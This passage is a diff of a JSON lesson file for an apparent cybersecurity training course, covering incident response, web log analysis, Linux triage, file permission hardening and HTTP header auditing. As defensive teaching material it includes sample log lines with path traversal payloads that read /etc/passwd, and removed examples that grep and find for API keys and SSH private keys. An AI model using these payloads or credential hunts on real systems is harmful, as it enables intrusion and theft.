-        "instruction": "Use `echo 'SGFja2VyVmlld1JlYWR5' | base64 -d` to decode the unencrypted string.",
+        "title": "Task 1: Encode string with base64",
+        "instruction": "Execute `echo -n \"secret\" | base64` in the terminal.",
         "hints": [
-          "Concept: Base64 decoding.",
-          "Direction: Pipe the string into base64 with the decode flag.",
-          "Tool: `base64`",
-          "Syntax: `echo 'SGFja2VyVmlld1JlYWR5' | base64 -d`",
-          "Explanation: Output will show the clear text."
+          "Type: `echo -n \"secret\" | base64`"
         ]
       }
     ],
-    "explainResult": "The `base64 -d` utility translated the 6-bit ASCII characters back into their original 8-bit byte representation without needing any cryptographic key.",
-    "securityConnection": "Cryptographic failures are #2 on the OWASP Top 10. Attackers frequently discover web applications that transmit sensitive session tokens in Base64 or use outdated hashing algorithms (like MD5 or SHA-1) that can be broken using precomputed rainbow tables or GPU hash-cracking rigs.",
-    "completion": {
-      "learned": [
-        "The fundamental rule: Encoding ≠ Encryption ≠ Hashing",
-        "How Base64 encoding works and why it offers zero security",
-        "One-way cryptographic hashing for data integrity and password storage",
-        "Symmetric encryption (AES) vs Asymmetric encryption (RSA/ECC)"
-      ],
-      "practiced": [
-        "base64 -d",
-        "Differentiating encoding from encryption",
-        "Identifying public vs private key usage"
-      ]
-    },
-    "nextRoomId": "room-19"
+    "securityConnection": "In **Lab 11 (lab-jwt)**, you inspect JSON Web Tokens (JWTs). Beginners often assume JWTs are encrypted; in reality, they are merely **Base64URL-encoded**! Anyone who intercepts the token can decode the payload instantly with `base64 -d`.",
+    "id": "room-38",
+    "nextRoomId": "room-39"
   },
   {
-    "id": "room-19",
-    "stage": 5,
-    "stageTitle": "Stage 5 — Security Tools",
-    "title": "Linux Security Practitioner Toolkit",
+    "stage": 6,
+    "level": 6,
+    "levelTitle": "Level 6 \u2014 Cybersecurity Fundamentals",
+    "title": "Defensive Controls, Security Logs & Incident Response",
     "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
     "estimatedTime": "30 min",
-    "prerequisites": "Stage 4 (Cybersecurity Fundamentals)",
-    "whyAreYouHere": "Before installing specialized hacking frameworks, professional security engineers and incident responders rely heavily on native Linux command-line utilities. These tools exist on almost every server worldwide. In this room, you will master the security analyst's core toolkit: `grep` (pattern search), `find` (locating files), `strings` (binary analysis), `curl` (request crafting), and process auditing utilities.",
+    "prerequisites": "Room 38: Encoding vs Hashing vs Encryption",
+    "whyAreYouHere": "When a cyber incident strikes, the difference between a minor annoyance and a catastrophic corporate bankruptcy is how fast the security team detects, contains, and remediates the intrusion. In this room, you will learn about the 6-phase Incident Response lifecycle, explore Security Information and Event Management (SIEM) platforms, and practice analyzing real web server access logs to hunt down attacker payloads.",
     "objectives": [
-      "Master text searching and log carving using `grep` with regular expressions",
-      "Find sensitive files and misconfigurations using the powerful `find` command",
-      "Extract human-readable strings from compiled binary malware using `strings`",
-      "Automate network and file downloads using `curl` and `wget`",
-      "Audit active processes and resource consumption using `ps aux` and `top`"
+      "Understand the 6 phases of the Incident Response lifecycle: Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned",
+      "Learn the role of SIEM (Security Information & Event Management) platforms like Splunk and Elastic",
+      "Understand common web server log formats (Common Log Format / Nginx / Apache access logs)",
+      "Identify attack signatures in web access logs: Path Traversal (`../`), Web Shells (`uploads`), and SQL Injection",
+      "Investigate brute-force attacks in authentication logs (`auth.log`)"
     ],
     "vocabulary": [
       {
-        "term": "grep",
-        "definition": "A Unix command-line utility used to search plain-text data sets for lines that match a regular expression or keyword."
+        "term": "Incident Response (IR)",
+        "definition": "The structured methodology an organization uses to detect, respond to, contain, and recover from a cyberattack."
       },
       {
-        "term": "find",
-        "definition": "A command-line utility that searches one or more directory trees for files meeting specific criteria (size, permissions, name, time)."
+        "term": "SIEM (Security Information and Event Management)",
+        "definition": "A security software system that aggregates, correlates, and analyzes log data from thousands of devices across an enterprise in real time."
       },
       {
-        "term": "strings",
-        "definition": "A utility that scans binary executable files and outputs sequences of printable characters at least 4 characters long."
+        "term": "SOC (Security Operations Center)",
+        "definition": "The centralized team of cybersecurity analysts responsible for monitoring, detecting, and responding to security incidents 24/7."
       },
       {
-        "term": "Piping (`|`)",
-        "definition": "A shell operator that feeds the standard output of one command directly into the standard input of another command."
+        "term": "IoC (Indicator of Compromise)",
+        "definition": "Forensic evidence of a cyber intrusion on a network or host (e.g., a known malicious IP address, file hash, or domain)."
       },
       {
-        "term": "ps aux",
-        "definition": "A command that lists every active running process on the system along with owner, PID, CPU/RAM usage, and command path."
+        "term": "Access Log",
+        "definition": "A text log file maintained by web servers (Apache, Nginx) recording every HTTP request received (IP, timestamp, method, URL, status code, user agent)."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Big Three: grep, find, and strings",
-        "content": "• `grep -rn \"password\" /var/www/`: Searches recursively (`-r`) with line numbers (`-n`) through all web source code for hardcoded passwords.\n• `find / -name \"*.conf\" 2>/dev/null`: Searches the entire drive for configuration files, hiding error messages (`2>/dev/null`).\n• `strings suspicious.bin | grep -i \"http\"`: Extracts text embedded inside an unknown compiled binary and filters for network URLs or C2 domains."
+        "title": "1. The 6 Phases of Incident Response (NIST / SANS)",
+        "content": "1. **Preparation**: Train staff, configure logs, deploy EDR agents, create incident response playbooks.\n2. **Identification (Detection)**: A SOC analyst notices an alert: *\"10,000 failed SSH logins followed by a root shell!\"*\n3. **Containment**: Isolate the infected machine from the network (pull the network cable or revoke VLAN access) to prevent lateral movement.\n4. **Eradication**: Remove malware, delete backdoor accounts, patch the vulnerable software.\n5. **Recovery**: Restore clean data from offline backups, test system operations, return to production.\n6. **Lessons Learned**: Post-incident review: What happened? How do we update our defenses so this never happens again?"
       },
       {
-        "title": "2. The Power of Unix Pipes (`|`)",
-        "content": "The Unix philosophy is: *Build small programs that do one thing well, and connect them together with pipes*.\nExample: `ps aux | grep \"python\" | awk '{print $2}'`\nThis lists all processes, filters for Python scripts, and extracts only their Process IDs!"
+        "title": "2. Reading a Web Server Access Log",
+        "content": "An Nginx/Apache log line tells a complete forensic story:\n\n`192.168.1.100 - - [15/Oct/2026:10:14:02 +0000] \"GET /view?file=../../../../etc/passwd HTTP/1.1\" 200 1840`\n\n\u2022 `192.168.1.100`: Attacker's IP address.\n\u2022 `[15/Oct/2026...]`: Precise timestamp of the attack.\n\u2022 `GET /view?file=../../../../etc/passwd`: The attacker's payload (Path Traversal attempting to read password hashes!).\n\u2022 `200`: HTTP Status Code. **200 OK means the attack SUCCEEDED** and the server returned the file bytes!\n\u2022 `1840`: Number of bytes returned."
       }
     ],
     "seeExamples": [
       {
-        "title": "Carving Secrets with grep and find",
-        "codeOrDiagram": "cadet@endlessus:~$ grep -rEi \"api[_-]?key\" /etc/webapp/\n/etc/webapp/config.py:  AWS_API_KEY = \"AKIAIOSFODNN7EXAMPLE\"\n/etc/webapp/db.json:    \"api_key\": \"sec_live_99214a8\"\n\ncadet@endlessus:~$ find /home -type f -perm -0400 2>/dev/null\n/home/cadet/.ssh/id_rsa",
-        "explanation": "Combining recursive grep with case-insensitive search (`-i`) quickly locates hardcoded credentials left behind by developers."
+        "title": "Hunting Path Traversal in Access Logs with grep",
+        "codeOrDiagram": "cadet@endlessus:~$ grep -E \"\\.\\./\" access.log\n192.168.1.105 - - [15/Oct/2026:14:02:11 +0000] \"GET /static/../../etc/passwd HTTP/1.1\" 200 2410\n\n[!] Incident Detected: Attacker IP 192.168.1.105 successfully downloaded /etc/passwd via directory traversal!",
+        "explanation": "`grep -E \"\\.\\./\"` isolates path traversal attempts containing dot-dot-slash patterns."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Search the `/var/log/audit.log` file for all occurrences of 'FAILED_LOGIN' using grep: `grep \"FAILED_LOGIN\" /var/log/audit.log`:",
+      "prompt": "Run `grep -E \"\\.\\./\" access.log` in the terminal to isolate directory traversal attacks in the web log:",
       "initialCommand": "",
-      "expectedCommand": "grep \"FAILED_LOGIN\" /var/log/audit.log",
-      "simulatedOutput": "Oct  5 16:30:12 auth-svc: FAILED_LOGIN user=admin src=192.168.1.99 port=44122\nOct  5 16:30:14 auth-svc: FAILED_LOGIN user=root src=192.168.1.99 port=44124\nOct  5 16:30:16 auth-svc: FAILED_LOGIN user=test src=192.168.1.99 port=44126\n[+] Success! 3 failed login attempts isolated from IP 192.168.1.99.",
-      "explanation": "`grep` quickly extracts only the lines of interest out of thousands of log entries."
+      "expectedCommand": "grep -E \"\\.\\./\" access.log",
+      "simulatedOutput": "192.168.1.105 - - [15/Oct/2026:14:02:11 +0000] \"GET /static/../../etc/passwd HTTP/1.1\" 200 2410\n[+] Attack vector isolated: Path traversal identified from IP 192.168.1.105.",
+      "explanation": "`grep -E` filters access logs for path traversal patterns."
     },
     "questions": [
       {
-        "id": "r19-q1",
-        "type": "multiple-choice",
-        "question": "Which Linux utility scans a compiled, unreadable binary file and prints out all ASCII and UTF-8 printable text strings embedded inside it?",
-        "options": [
-          "strings",
-          "cat",
-          "rm",
-          "fdisk"
+        "id": "q-39-1",
+        "type": "exact",
+        "question": "What 4-letter acronym represents centralized software platforms that collect, aggregate, and analyze security logs from across an enterprise (e.g. Splunk)?",
+        "visualSlots": "_ _ _ _",
+        "acceptedAnswers": [
+          "SIEM"
         ],
-        "correctIndex": 0,
-        "explanation": "`strings` extracts readable sequences from binary code, often revealing hardcoded passwords, IP addresses, or author names."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Security Information and Event Management.",
+        "explanation": "SIEM stands for Security Information and Event Management."
       },
       {
-        "id": "r19-q2",
-        "type": "command-interpretation",
-        "question": "In the command `grep -rn \"SECRET\" /home/cadet/`, what does the `-r` flag specify?",
+        "id": "q-39-2",
+        "type": "multiple-choice",
+        "question": "In which phase of the Incident Response lifecycle does the security team isolate an infected computer from the network to stop malware from spreading laterally?",
         "options": [
-          "Remove matching files",
-          "Search recursively through all subdirectories",
-          "Reverse the search results",
-          "Restart the computer after completion"
+          "Preparation",
+          "Containment",
+          "Recovery",
+          "Eradication"
         ],
         "correctIndex": 1,
-        "explanation": "The `-r` (or `-R`) flag instructs grep to search recursively into all subdirectories."
+        "hint": "Containing the damage.",
+        "explanation": "The Containment phase isolates compromised systems to limit the blast radius."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Search Audit Log with Grep",
-        "instruction": "Execute `grep \"FAILED_LOGIN\" /var/log/audit.log` to identify failed authentication events.",
+        "title": "Task 1: Search access log for attacks",
+        "instruction": "Execute `grep -E \"\\.\\./\" access.log` in the terminal.",
         "hints": [
-          "Concept: Filter text lines matching a string.",
-          "Direction: Use grep with target string and filepath.",
-          "Tool: `grep`",
-          "Syntax: `grep \"FAILED_LOGIN\" /var/log/audit.log`",
-          "Explanation: Isolates brute-force indicators."
+          "Type: `grep -E \"\\.\\./\" access.log`"
         ]
       }
     ],
-    "explainResult": "The `grep` command buffered the log file line by line, evaluated each against the regex pattern, and printed matches to standard output.",
-    "securityConnection": "During incident triage, attackers may delete source code or replace system binaries with trojans. Incident responders use `strings`, `grep`, and `find -mtime` to reconstruct timelines and extract command-and-control server IPs without needing high-end commercial forensics software.",
-    "completion": {
-      "learned": [
-        "How to use grep for rapid log analysis and credential hunting",
-        "How to use find to locate sensitive or misconfigured files",
-        "Extracting ASCII artifacts from compiled binaries using strings",
-        "Chaining commands together using Unix pipes"
-      ],
-      "practiced": [
-        "grep \"FAILED_LOGIN\" /var/log/audit.log",
-        "Piping command outputs",
-        "Carving forensic log evidence"
-      ]
-    },
-    "nextRoomId": "room-20"
+    "securityConnection": "In **Lab 09 (lab-logs)**, you act as an incident responder investigating a breached enterprise server. You analyze Apache `access.log` to track an attacker who exploited directory traversal to upload a web shell, and search `auth.log` for failed passwords to identify the attacker's external brute-force IP.",
+    "id": "room-39",
+    "nextRoomId": "room-40"
   },
   {
-    "id": "room-20",
-    "stage": 5,
-    "stageTitle": "Stage 5 — Security Tools",
-    "title": "Nmap & Network Enumeration",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "estimatedTime": "35 min",
-    "prerequisites": "Room 08 (Ports & Services) & Room 19 (Linux Toolkit)",
-    "whyAreYouHere": "You now know what IP addresses, ports, and TCP handshakes are. How does a penetration tester discover what services and vulnerabilities are live on a target network? The undisputed industry standard tool is **Nmap (Network Mapper)**. In this room, you will learn how Nmap scans ports, detects service versions, identifies operating systems, and uses the Nmap Scripting Engine (NSE).",
+    "stage": 7,
+    "level": 7,
+    "levelTitle": "Level 7 \u2014 First Practical Security Labs",
+    "title": "Linux Command-Line Investigation",
+    "difficulty": "Practical",
+    "difficultyBadge": "\ud83d\udd34 Practical",
+    "estimatedTime": "30 min",
+    "prerequisites": "Level 6: Cybersecurity Fundamentals",
+    "whyAreYouHere": "You have completed the theoretical foundations of computer architecture, operating systems, networking, web protocols, and cybersecurity principles. Now it is time to put your skills into practical action. In this room, you will conduct a simulated command-line investigation on a Linux system, navigating unfamiliar directory structures and extracting security evidence.",
     "objectives": [
-      "Understand what network port scanning is and how Nmap functions",
-      "Learn the difference between a TCP Connect scan (`-sT`) and a TCP SYN Stealth scan (`-sS`)",
-      "Perform Service and Version detection using `-sV`",
-      "Use the Nmap Scripting Engine (`-sC` / `--script`) to automate vulnerability checks",
-      "Interpret Nmap scan results to build a target attack profile"
+      "Conduct a live terminal investigation using `whoami`, `pwd`, and `id`",
+      "Navigate multi-level filesystem hierarchies using absolute and relative paths",
+      "Inspect hidden configuration files using `ls -la` and `cat`",
+      "Search and isolate specific indicator strings using `grep`",
+      "Complete your first practical terminal challenge and extract verification tokens"
+    ],
+    "vocabulary": [
+      {
+        "term": "Triage",
+        "definition": "The rapid assessment and initial inspection of a target system to determine its state, user context, and security posture."
+      },
+      {
+        "term": "Artifact",
+        "definition": "A piece of digital forensic evidence left on a computer (log entry, temporary file, bash history, downloaded script)."
+      },
+      {
+        "term": "Flag Token",
+        "definition": "A unique secret cryptographic string (e.g. flag{...}) hidden in practical labs to prove you successfully solved an objective."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. The 5-Step System Triage Methodology",
+        "content": "Whenever you land on an unknown terminal, execute this standard 5-step triage sequence:\n\n1. `whoami`: What user account am I running as?\n2. `id`: What groups and privileges do I possess?\n3. `pwd`: Where on the disk am I located?\n4. `uname -a`: What OS distribution and kernel version is running?\n5. `ls -la`: What files, hidden dots, and subfolders exist in my current location?"
+      },
+      {
+        "title": "2. Investigating Hidden Clues",
+        "content": "On Unix systems, files beginning with a dot (like `.bash_history` or `.env`) are hidden from standard `ls` output. Attackers and developers frequently hide API keys, credentials, and test notes in hidden files:\n\n`cadet@endlessus:~$ ls -la`\n\nAlways inspect the contents of `.bash_history`\u2014it reveals what commands the previous administrator or attacker executed before you arrived!"
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Live Investigation Workflow",
+        "codeOrDiagram": "cadet@endlessus:~$ whoami\ncadet\ncadet@endlessus:~$ ls -la\ntotal 16\ndrwxr-xr-x 2 cadet cadet 4096 Oct 15 12:00 .\ndrwxr-xr-x 4 root  root  4096 Oct 15 11:00 ..\n-rw-r--r-- 1 cadet cadet  220 Oct 15 11:30 .bash_history\n-rw-r--r-- 1 cadet cadet  140 Oct 15 12:05 notes.txt\n\ncadet@endlessus:~$ cat notes.txt | grep -i \"secret\"\nFLAG: flag{linux_cli_investigation_complete}",
+        "explanation": "Stepping through triage, listing all files including hidden ones, and filtering for target secrets."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `whoami && pwd && ls -la` in the interactive terminal to perform standard initial triage:",
+      "initialCommand": "",
+      "expectedCommand": "whoami && pwd && ls -la",
+      "simulatedOutput": "cadet\n/home/cadet\ntotal 8\n-rw-r--r-- 1 cadet cadet 140 Oct 15 12:05 notes.txt\n[+] Initial triage complete: Session identity and files cataloged.",
+      "explanation": "Executes initial triage commands in sequence."
+    },
+    "questions": [
+      {
+        "id": "q-40-1",
+        "type": "exact",
+        "question": "Which Linux utility prints the user's previously executed terminal commands, often examined by forensic investigators?",
+        "visualSlots": "_ _ _ _ _ _ _",
+        "acceptedAnswers": [
+          "history"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "The word history.",
+        "explanation": "The `history` command (and `.bash_history` file) stores previous commands."
+      },
+      {
+        "id": "q-40-2",
+        "type": "multiple-choice",
+        "question": "What is the primary reason security practitioners run `ls -la` instead of just `ls` during system investigation?",
+        "options": [
+          "It runs faster by skipping file permissions",
+          "It displays hidden files (beginning with a dot) and full file metadata including permissions and modification dates",
+          "It automatically deletes temporary files",
+          "It reboots the computer if unauthorized files are found"
+        ],
+        "correctIndex": 1,
+        "hint": "Shows hidden files and permissions.",
+        "explanation": "`ls -la` exposes hidden dot-files and full permission/timestamp metadata essential for triage."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Complete initial triage sequence",
+        "instruction": "Execute `whoami && pwd && ls -la` in the terminal.",
+        "hints": [
+          "Type: `whoami && pwd && ls -la`"
+        ]
+      }
+    ],
+    "securityConnection": "In real-world incident response, capturing terminal history and inspecting current directory state without modifying file access times (preserving timestamps) is critical for courtroom admissibility of digital evidence.",
+    "id": "room-40",
+    "nextRoomId": "room-41"
+  },
+  {
+    "stage": 7,
+    "level": 7,
+    "levelTitle": "Level 7 \u2014 First Practical Security Labs",
+    "title": "File & Permission Auditing (Practical Lab 02)",
+    "difficulty": "Practical",
+    "difficultyBadge": "\ud83d\udd34 Practical",
+    "estimatedTime": "35 min",
+    "prerequisites": "Room 40: Linux Command-Line Investigation",
+    "whyAreYouHere": "A real-world Linux server stores thousands of sensitive files: database passwords in `config.php`, private SSH keys in `id_rsa`, and shadow password hashes. If a system administrator makes a configuration file world-writable or world-readable, any unprivileged user on the machine can read or tamper with it. In this lab, you audit and harden permissions on live files in the virtual environment.",
+    "objectives": [
+      "Audit directory permissions using `ls -la` to spot world-writable (`666` / `777`) security risks",
+      "Inspect sensitive database credentials inside an insecure `config.php` file",
+      "Harden the configuration file using `chmod 600 config.php` so only the owner has access",
+      "Verify octal permission changes using `stat -c \"%a %n\" config.php`",
+      "Extract the lab completion flag and verify it in the Endlessus engine"
+    ],
+    "vocabulary": [
+      {
+        "term": "World-Writable",
+        "definition": "A file permission state where any user account on the entire system can modify or wipe the file contents (permissions ending in -w- or octal 2/6/7)."
+      },
+      {
+        "term": "Hardening",
+        "definition": "The defensive process of securing a system by reducing its vulnerability surface and enforcing strict least-privilege permissions."
+      },
+      {
+        "term": "stat",
+        "definition": "A Linux utility that displays detailed inode and status information about a file, including exact octal permission values."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. Auditing config.php Permissions",
+        "content": "In this hands-on lab, your mission is to secure an enterprise web server:\n\n1. Type `ls -la config.php`.\n2. Notice the permissions: `-rw-rw-rw-` (octal `666`). This means *anyone* on the computer can view or modify the database credentials!\n3. Read the credentials using `cat config.php`.\n4. Apply least-privilege: Run `chmod 600 config.php` so only you can read and write to it.\n5. Verify with `stat -c \"%a %n\" config.php` to prove it is now `600`!"
+      },
+      {
+        "title": "2. Least Privilege and Credential Protection",
+        "content": "Configuration files like `config.php`, `.env`, and `database.yml` often contain high-value secrets: API keys, database credentials, and session tokens. If set to `666` or `777`, any local attacker or compromised web process can overwrite them or steal passwords. Hardening to `600` (`rw-------`) or `640` (`rw-r-----`) ensures that only the application service account or system administrator can access the file."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Expected Lab Commands",
+        "codeOrDiagram": "cadet@endlessus:~$ ls -la config.php\n-rw-rw-rw- 1 cadet cadet 840 Oct 15 11:00 config.php\n\ncadet@endlessus:~$ cat config.php\n// DB_PASS = SuperSecretDatabasePassword!\n\ncadet@endlessus:~$ chmod 600 config.php\ncadet@endlessus:~$ stat -c \"%a %n\" config.php\n600 config.php",
+        "explanation": "Auditing permissions, inspecting contents, and locking down with `chmod 600`."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `ls -la config.php && cat config.php` to audit the insecure configuration file:",
+      "initialCommand": "",
+      "expectedCommand": "ls -la config.php && cat config.php",
+      "simulatedOutput": "-rw-rw-rw- 1 cadet cadet 840 Oct 15 11:00 config.php\nDB_HOST=10.10.10.50\nDB_USER=app_db\nDB_PASS=SuperSecretDatabasePass!123\n[+] Credentials exposed: Insecure world-writable file verified.",
+      "explanation": "Exposes world-writable permissions and cleartext credentials."
+    },
+    "questions": [
+      {
+        "id": "q-41-1",
+        "type": "exact",
+        "question": "What 3-digit octal permission value restricts a sensitive file to owner-read/write only (rw-------)?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "600"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Three digits: 600.",
+        "explanation": "Octal 600 enforces rw------- (owner read/write only)."
+      },
+      {
+        "id": "q-41-2",
+        "type": "multiple-choice",
+        "question": "Why is a file with octal permissions 777 considered a severe security vulnerability for configuration files?",
+        "options": [
+          "It makes the computer run 7 times slower",
+          "It grants read, write, and execute permissions to every single user on the system, allowing unprivileged accounts to tamper with it",
+          "It corrupts the SSD file tables",
+          "It disables all network adapters"
+        ],
+        "correctIndex": 1,
+        "hint": "Full access granted to all users.",
+        "explanation": "777 grants universal read, write, and execute rights to all users, violating the principle of least privilege."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Audit and harden config.php",
+        "instruction": "Open the Practice Terminal or Lab 02 to audit config.php and execute `chmod 600 config.php`.",
+        "hints": [
+          "Type: `ls -la config.php`",
+          "Type: `chmod 600 config.php`",
+          "Type: `stat -c \"%a %n\" config.php`"
+        ]
+      }
+    ],
+    "securityConnection": "This lab directly mirrors **Lab 02: Linux Permissions & Octal Masking** (`lab-permissions`) in the Endlessus terminal engine. Completing it grants practical XP and reinforces system administration best practices.",
+    "id": "room-41",
+    "nextRoomId": "room-42"
+  },
+  {
+    "stage": 7,
+    "level": 7,
+    "levelTitle": "Level 7 \u2014 First Practical Security Labs",
+    "title": "HTTP Security Headers Auditing (Practical Lab 01)",
+    "difficulty": "Practical",
+    "difficultyBadge": "\ud83d\udd34 Practical",
+    "estimatedTime": "35 min",
+    "prerequisites": "Room 41: File & Permission Auditing",
+    "whyAreYouHere": "Web browsers respect security policies sent by servers in HTTP headers. If an organization forgets to configure `Strict-Transport-Security` (HSTS), users are susceptible to SSL stripping attacks. If they omit `X-Frame-Options`, the website can be framed inside a malicious site to steal clicks (Clickjacking). In this lab, you audit a staging financial server using curl pipelines and inspect hardened Nginx configurations.",
+    "objectives": [
+      "Audit live server response headers using `curl -I https://staging.acmefin.local`",
+      "Isolate missing HSTS headers using `curl -I https://staging.acmefin.local | grep -i strict`",
+      "Audit iframe framing protection using `curl -I https://staging.acmefin.local | grep -i frame`",
+      "Inspect session cookie security flags using `curl -I https://staging.acmefin.local | grep -i set-cookie`",
+      "Review the production hardened Nginx configuration in `/etc/nginx/conf.d/security.conf` and submit the flag"
+    ],
+    "vocabulary": [
+      {
